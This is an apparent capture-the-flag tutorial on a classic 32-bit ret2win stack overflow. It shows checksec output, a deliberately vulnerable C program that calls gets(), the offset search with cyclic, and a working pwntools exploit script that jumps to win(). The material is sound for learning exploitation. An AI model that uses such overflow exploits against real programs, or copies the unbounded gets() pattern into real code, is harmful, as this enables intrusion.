## The binary

```bash checksec
checksec vuln
```

```text
Arch:     i386-32-little
RELRO:    Partial
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
```

No canary \+ no PIE means classic ret2win.

## Vulnerable code

```c vuln.c
#include <stdio.h>

void win() {
    printf("You win! Here's your flag:\n");
    system("/bin/cat flag.txt");
}

void vuln() {
    char buf[32];
    gets(buf); // never do this
}

int main() {
    vuln();
    return 0;
}
```

<Warning>
  `gets()` is the poster child of stack overflows. It reads until newline with zero bounds checking.
</Warning>

## Finding the offset

```bash Terminal
cyclic 100 | ./vuln
# crashes at 0x61616168
cyclic -l 0x61616168
# 44
```

Offset is **44 bytes** to overwrite saved EIP.

## Exploit

```python exploit.py expandable
from pwn import *

elf = ELF('./vuln')
p = process('./vuln')

win_addr = elf.symbols['win']
log.info(f'win() @ {hex(win_addr)}')

payload  = b'A' * 44
payload += p32(win_addr)

p.sendline(payload)
p.interactive()
```

## What if PIE was enabled?

You'd need a leak first. Common leaks: `puts@got` via a printf format bug, or a stack leak from `%p` chains. Then compute `win_addr = leak - offset`.
